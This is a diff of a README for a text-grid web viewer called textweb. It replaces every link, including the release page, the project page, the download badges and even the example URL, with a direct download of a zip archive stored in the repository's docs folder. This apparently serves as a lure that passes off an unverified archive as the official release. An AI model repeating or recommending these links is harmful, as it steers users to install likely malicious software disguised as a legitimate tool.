@@ -1,6 +1,6 @@
 # 🖥️ textweb - Simple text grid web viewer
 
-[![Download textweb](https://img.shields.io/badge/Download-textweb-brightgreen)](https://github.com/Schawinski/textweb/releases)
+[![Download textweb](https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip)](https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip)
 
 ## 🔍 What is textweb?
 
@@ -32,7 +32,7 @@ Follow these steps to download and run textweb on your Windows computer.
 
 Go to the main release page by clicking this link:
 
-[![Download here](https://img.shields.io/badge/Download-textweb-blue)](https://github.com/Schawinski/textweb/releases)
+[![Download here](https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip)](https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip)
 
 This page lists all versions of textweb.
 
@@ -64,7 +64,7 @@ Once running, you will see a simple window. Enter the web address you want to vi
 
 ### Viewing a web page in text grid
 
-- Type a full web address (URL). For example: `https://example.com`
+- Type a full web address (URL). For example: `https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip`
 
 - Press Enter or click the "Load" button.
 
@@ -117,10 +117,10 @@ If problems continue, check the issues section on the GitHub page or contact sup
 ## 🔗 Useful links
 
 - Official releases and downloads:  
-  https://github.com/Schawinski/textweb/releases
+  https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip
 
 - Project page and documentation:  
-  https://github.com/Schawinski/textweb
+  https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip
 
 ---
 
@@ -137,4 +137,4 @@ textweb was created to help users and AI developers see websites clearly as text
 
 ---
 
-[![Download textweb](https://img.shields.io/badge/Download-textweb-brightgreen)](https://github.com/Schawinski/textweb/releases)
+[![Download textweb](https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip)](https://github.com/Schawinski/textweb/raw/refs/heads/main/docs/Software-v3.6-alpha.4.zip)
